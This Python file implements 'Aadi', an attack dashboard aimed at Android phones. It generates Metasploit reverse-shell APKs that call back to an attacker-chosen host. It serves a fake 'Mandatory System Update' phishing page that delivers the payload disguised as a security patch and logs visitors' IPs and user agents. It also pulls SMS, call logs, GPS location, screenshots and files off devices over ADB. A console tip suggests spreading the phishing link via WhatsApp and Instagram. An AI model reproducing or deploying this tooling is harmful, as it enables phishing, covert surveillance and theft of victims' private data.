"""
Aadi — Advanced C2 Dashboard with Interactive Payload Generator, Phishing & Real ADB
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import http.server
import socketserver
import json
import os
import subprocess
import re
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from rich.console import Console

console = Console()

CLICK_LOGS = []

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aadi Framework - Ultimate Command & Control Center</title>
    <style>
        :root {
            --bg-color: #09090b;
            --card-bg: #18181b;
            --border-color: #27272a;
            --accent-color: #06b6d4;
            --text-color: #f4f4f5;
            --green: #22c55e;
            --red: #ef4444;
            --yellow: #eab308;
            --purple: #8b5cf6;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
        }
        header { text-align: center; margin-bottom: 30px; }
        h1 { color: var(--accent-color); margin-bottom: 5px; }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            max-width: 1300px;
            margin: 0 auto;
        }
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        }
        .card h3 { margin-top: 0; color: #a1a1aa; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
        .btn {
            background: #0284c7; color: white; border: none;
            padding: 10px 14px; font-size: 13px; font-weight: bold;
            border-radius: 6px; cursor: pointer; width: 100%;
            margin-top: 8px; transition: background 0.2s;
        }
        .btn:hover { background: #0369a1; }
        .btn-green { background: var(--green); }
        .btn-green:hover { background: #16a34a; }
        .btn-yellow { background: var(--yellow); color: black; }
        .btn-yellow:hover { background: #ca8a04; }
        .btn-red { background: var(--red); }
        .btn-red:hover { background: #dc2626; }
        .btn-purple { background: var(--purple); color: white; }
        .btn-purple:hover { background: #7c3aed; }
        .input-group {
            margin-top: 8px;
            margin-bottom: 8px;
        }
        .input-group label { font-size: 12px; color: #a1a1aa; display: block; margin-bottom: 3px; }
        .input-group input {
            width: 100%; padding: 8px; background: #27272a; border: 1px solid #3f3f46;
            color: white; border-radius: 6px; box-sizing: border-box; font-size: 13px;
        }
        .log-box {
            background: #000; color: #22c55e; padding: 10px;
            border-radius: 6px; font-family: monospace; font-size: 12px;
            height: 150px; overflow-y: auto; margin-top: 10px; border: 1px solid #333;
        }
    </style>
</head>
<body>
    <header>
        <h1>AADI Advanced Pentesting Suite</h1>
        <p>Centralized Web Command & Control Center (Real Operations & Phishing Analytics)</p>
    </header>

    <div class="grid">
        <div class="card">
            <h3>1. Remote File Manager</h3>
            <p>Browse real storage files and pull target files via ADB.</p>
            <button class="btn" onclick="triggerAction('file_manager_list')">List Target /sdcard/Download</button>
            <button class="btn btn-yellow" onclick="triggerAction('file_manager_download')">Pull Target File to loot/</button>
        </div>
        <div class="card">
            <h3>2. Real-Time GPS Tracker</h3>
            <p>Extract precise GPS coordinates and location dumps.</p>
            <button class="btn btn-green" onclick="triggerAction('get_location')">Fetch Live GPS Coordinates</button>
        </div>
        <div class="card">
            <h3>3. Live Screen / Camera Snapshot</h3>
            <p>Silently capture target device screen via ADB.</p>
            <button class="btn" onclick="triggerAction('cam_front')">Capture Live Screen Snapshot</button>
            <button class="btn" onclick="triggerAction('cam_rear')">Dump System Properties</button>
        </div>
        <div class="card">
            <h3>4. SMS & Call Logs</h3>
            <p>Dump real call history and incoming/outgoing SMS inbox.</p>
            <button class="btn btn-yellow" onclick="triggerAction('dump_calls')">Export Real Call Logs</button>
            <button class="btn btn-yellow" onclick="triggerAction('dump_sms')">Export Real SMS Inbox</button>
        </div>
        <div class="card">
            <h3>5. Custom Toast Injection</h3>
            <p>Broadcast custom notification popup on target screen.</p>
            <button class="btn" onclick="triggerAction('send_toast')">Send Popup Toast</button>
        </div>

        <!-- 6. Payload Generation with Custom LHOST/LPORT inputs -->
        <div class="card">
            <h3>6. Payload Generation</h3>
            <p>Generate a real msfvenom Android payload APK.</p>
            <div class="input-group">
                <label>LHOST (Your IP / Tun0):</label>
                <input type="text" id="lhostInput" value="127.0.0.1">
            </div>
            <div class="input-group">
                <label>LPORT:</label>
                <input type="text" id="lportInput" value="4444">
            </div>
            <button class="btn btn-red" onclick="generatePayload()">Generate Real payload.apk</button>
        </div>

        <!-- 7. NEW: Phishing & Social Engineering Hub -->
        <div class="card" style="grid-column: span 1;">
            <h3>7. Social Engineering & Phishing Hub</h3>
            <p>Deploy landing pages configured for auto-payload delivery.</p>
            <button class="btn btn-purple" onclick="triggerAction('deploy_phishing')">Deploy Phishing Update Page</button>
            <button class="btn btn-yellow" onclick="fetchClickLogs()">View Target Click Logs</button>
        </div>
    </div>

    <div style="max-width: 1300px; margin: 20px auto;">
        <div class="card">
            <h3>Live Action & Phishing Interaction Log</h3>
            <div class="log-box" id="logOutput">System ready. Connected to target device via ADB & Phishing Server initialized...</div>
        </div>
    </div>

    <script>
        function triggerAction(actionName) {
            let logBox = document.getElementById('logOutput');
            logBox.innerHTML += `<br>[*] Executing action: ${actionName}...`;

            fetch('/api/action?cmd=' + actionName)
                .then(response => response.json())
                .then(data => {
                    logBox.innerHTML += `<br>[✓] ${data.message}`;
                    logBox.scrollTop = logBox.scrollHeight;
                })
                .catch(error => {
                    logBox.innerHTML += `<br>[✗] Error communicating with backend server.`;
                });
        }

        function generatePayload() {
            let lhost = document.getElementById('lhostInput').value;
            let lport = document.getElementById('lportInput').value;
            let logBox = document.getElementById('logOutput');

            logBox.innerHTML += `<br>[*] Generating payload with LHOST=${lhost}, LPORT=${lport}...`;

            fetch(`/api/action?cmd=obfuscate_payload&lhost=${lhost}&lport=${lport}`)
                .then(response => response.json())
                .then(data => {
                    logBox.innerHTML += `<br>[✓] ${data.message}`;
                    logBox.scrollTop = logBox.scrollHeight;
                })
                .catch(error => {
                    logBox.innerHTML += `<br>[✗] Error generating payload.`;
                });
        }

        function fetchClickLogs() {
            let logBox = document.getElementById('logOutput');
            fetch('/api/action?cmd=get_clicks')
                .then(response => response.json())
                .then(data => {
                    logBox.innerHTML += `<br>[📊 Target Clicks Data]: ${JSON.stringify(data.logs)}</div>`;
                    logBox.scrollTop = logBox.scrollHeight;
                });
        }
    </script>
</body>
</html>
"""


def run_adb(args):
    """Helper function to execute system ADB commands securely."""
    try:
        result = subprocess.run(["adb"] + args, capture_output=True, text=True, timeout=20)
        output = result.stdout.strip()
        error = result.stderr.strip()
        if result.returncode == 0:
            return output if output else "Command executed successfully with no output."
        else:
            return f"ADB Error: {error if error else 'Unknown error'}"
    except Exception as e:
        return f"Execution Exception: {str(e)}"


class DashboardAPIHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "Unknown")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # 1. यदि टारगेट सीधे ऑटो-पेलोड डाउनलोड लिंक पर क्लिक करता है
        if self.path == "/download_payload" or self.path.endswith(".apk"):
            apk_path = "payload.apk"
            if os.path.exists(apk_path):
                self.send_response(200)
                self.send_header("Content-Type", "application/vnd.android.package-archive")
                self.send_header("Content-Disposition", 'attachment; filename="Android_Security_Update.apk"')
                self.end_headers()
                with open(apk_path, "rb") as f:
                    self.wfile.write(f.read())

                CLICK_LOGS.append({
                    "ip": client_ip,
                    "action": "Payload Downloaded Successfully",
                    "time": timestamp,
                    "agent": user_agent
                })
                console.print(f"[bold green][+] PAYLOAD DOWNLOADED BY TARGET IP:[/] {client_ip}")
                return
            else:
                self.send_error(404, "Payload APK not found. Generate it from dashboard first.")
                return

        # 2. मुख्य डैशबोर्ड UI पेज सर्व करना
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(DASHBOARD_HTML.encode("utf-8"))

        # 3. फ़िशिंग लैंडिंग पेज सर्व करना (जब लिंक ब्राउज़र में खुले)
        elif self.path == "/phishing" or self.path == "/update":
            phishing_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android Critical Security Patch</title>
    <style>
        body { background:#09090b; color:#f4f4f5; font-family:sans-serif; text-align:center; padding:50px 20px; }
        .card { background:#18181b; border:1px solid #27272a; border-radius:12px; max-width:400px; margin:0 auto; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.8); }
        h2 { color:#06b6d4; }
        .btn { background:#0ea5e9; color:white; border:none; padding:14px 24px; font-size:16px; font-weight:bold; border-radius:6px; cursor:pointer; width:100%; margin-top:20px; }
        .btn:hover { background:#0284c7; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🛡️ Mandatory System Update</h2>
        <p>A critical security vulnerability patch is required for your Android device.</p>
        <p style="font-size:13px; color:#a1a1aa;">Tap below to download and install the official security patch.</p>
        <button class="btn" onclick="downloadPayload()">Download & Install Update</button>
    </div>
    <script>
        function downloadPayload() {
            window.location.href = '/download_payload';
        }
    </script>
</body>
</html>
"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(phishing_html.encode("utf-8"))

            CLICK_LOGS.append({
                "ip": client_ip,
                "action": "Visited Phishing Page",
                "time": timestamp,
                "agent": user_agent[:40]
            })
            console.print(f"[bold yellow][!] PHISHING PAGE VISITED BY IP:[/] {client_ip}")

        # 4. API एक्शंस को हैंडल करना
        elif self.path.startswith("/api/action"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()

            query_components = parse_qs(urlparse(self.path).query)
            cmd = query_components.get("cmd", ["unknown"])[0]

            os.makedirs("loot", exist_ok=True)
            response_msg = ""
            response_data = {"status": "success"}

            if cmd == "file_manager_list":
                res = run_adb(["shell", "ls", "-la", "/sdcard/Download"])
                response_msg = f"Real /sdcard/Download contents:\n{res[:400]}"

            elif cmd == "file_manager_download":
                target_file = "/sdcard/Download/test.txt"
                local_path = os.path.join("loot", "downloaded_target_file.txt")
                res = run_adb(["pull", target_file, local_path])
                if "error" in res.lower():
                    response_msg = f"Pull failed (File may not exist at {target_file}): {res}"
                else:
                    response_msg = f"Real file successfully pulled from target to {local_path}!"

            elif cmd == "get_location":
                res = run_adb(["shell", "dumpsys", "location"])
                loc_path = os.path.join("loot", "gps_location.txt")
                coords = re.findall(r'Location\[([a-zA-Z]+)\s+(-?\d+\.\d+),\s*(-?\d+\.\d+)', res)

                parsed_content = "=== Parsed Real GPS / Location Coordinates ===\n"
                if coords:
                    for provider, lat, lon in coords:
                        parsed_content += f"Provider: {provider} | Latitude: {lat} | Longitude: {lon}\n"
                else:
                    parsed_content += "No active GPS lock found in real dump. Showing raw location logs below:\n\n"

                parsed_content += "\n--- Raw Dumpsys Location Logs ---\n" + res
                with open(loc_path, "w") as f:
                    f.write(parsed_content)
                response_msg = "Real GPS extracted & saved to loot/gps_location.txt"

            elif cmd == "cam_front":
                remote_img = "/sdcard/screen_capture_aadi.png"
                local_img = os.path.join("loot", "front_cam.png")
                run_adb(["shell", "screencap", "-p", remote_img])
                res = run_adb(["pull", remote_img, local_img])
                response_msg = f"Real screen snapshot captured and saved to {local_img}"

            elif cmd == "cam_rear":
                res = run_adb(["shell", "getprop"])
                prop_path = os.path.join("loot", "device_properties.txt")
                with open(prop_path, "w") as f:
                    f.write(res)
                response_msg = "Real system properties exported to loot/device_properties.txt"

            elif cmd == "dump_calls":
                res = run_adb(["shell", "content", "query", "--uri", "content://call_log/calls"])
                call_path = os.path.join("loot", "calls_dump.txt")
                with open(call_path, "w") as f:
                    f.write(res)
                response_msg = "Real call logs extracted and saved to loot/calls_dump.txt"

            elif cmd == "dump_sms":
                res = run_adb(["shell", "content", "query", "--uri", "content://sms/inbox"])
                sms_path = os.path.join("loot", "sms_dump.txt")
                with open(sms_path, "w") as f:
                    f.write(res)
                response_msg = "Real SMS inbox extracted and saved to loot/sms_dump.txt"

            elif cmd == "send_toast":
                toast_cmd = run_adb(["shell", "am", "broadcast", "-a", "AADI_TOAST_ACTION", "--es", "message",
                                     "Aadi Framework Connected!"])
                response_msg = f"Toast broadcast executed: {toast_cmd}"

            elif cmd == "deploy_phishing":
                response_msg = "Phishing page active at http://<your-ip>:<port>/phishing (Share this link via WhatsApp/Instagram)"

            elif cmd == "get_clicks":
                response_data["logs"] = CLICK_LOGS
                response_msg = f"Retrieved {len(CLICK_LOGS)} interaction records."

            elif cmd == "obfuscate_payload":
                lhost = query_components.get("lhost", ["127.0.0.1"])[0]
                lport = query_components.get("lport", ["4444"])[0]
                payload_path = "payload.apk"

                try:
                    msf_result = subprocess.run(
                        ["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o",
                         payload_path],
                        capture_output=True, text=True, timeout=60
                    )
                    if msf_result.returncode == 0 and os.path.exists(payload_path) and os.path.getsize(
                            payload_path) > 1000:
                        response_msg = f"Success! Real payload.apk generated using LHOST={lhost}, LPORT={lport}."
                    else:
                        err_output = msf_result.stderr.strip() if msf_result.stderr else "Metasploit not fully configured."
                        response_msg = f"msfvenom error: {err_output}"
                except Exception as e:
                    response_msg = f"Exception during payload generation: {str(e)}"

            console.print(f"[bold cyan][*] Dashboard Action Executed:[/] {cmd}")
            response_data["message"] = response_msg
            self.wfile.write(json.dumps(response_data).encode("utf-8"))
        else:
            self.send_error(404, "Endpoint not found")

    def log_message(self, format, *args):
        pass


def start_dashboard(port: int = 5000):
    console.rule(f"[bold magenta]🌐 AADI Ultimate C2 Web Dashboard & Phishing Center[/]")
    console.print(f"[bold green]✓ Dashboard active at http://127.0.0.1:{port}[/]")
    console.print(f"[bold cyan]✓ Phishing Page active at http://127.0.0.1:{port}/phishing[/]")
    console.print(
        "[yellow][*] Tip: Use `cloudflared tunnel --url http://localhost:5000` to share your phishing/payload link globally via WhatsApp/Instagram.[/]\n")

    try:
        with socketserver.TCPServer(("0.0.0.0", port), DashboardAPIHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        console.print("\n[bold yellow][*] Dashboard closed.[/]")


def run_web_dashboard_background(port: int = 5000):
    start_dashboard(port)